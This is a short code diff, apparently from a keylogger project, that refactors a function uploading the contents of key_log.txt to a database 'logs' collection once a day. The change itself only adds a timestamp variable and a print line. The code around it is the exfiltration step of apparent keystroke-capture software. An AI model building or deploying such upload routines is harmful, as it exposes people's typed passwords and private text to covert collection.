@@ -84,10 +84,12 @@ def uploadFile():
     # get_Host_name_IP()
     f = open(log_dir + "key_log.txt")
     text = f.read()
+    insertion_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     doc = {
-    "file_name": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + " Log.txt",
+    "file_name": insertion_time + " Log.txt",
     "contents" : text }
     logs.insert_one(doc)
+    print("Log uploaded at " + insertion_time)
 
 timer = set_interval(uploadFile, 86400)
 
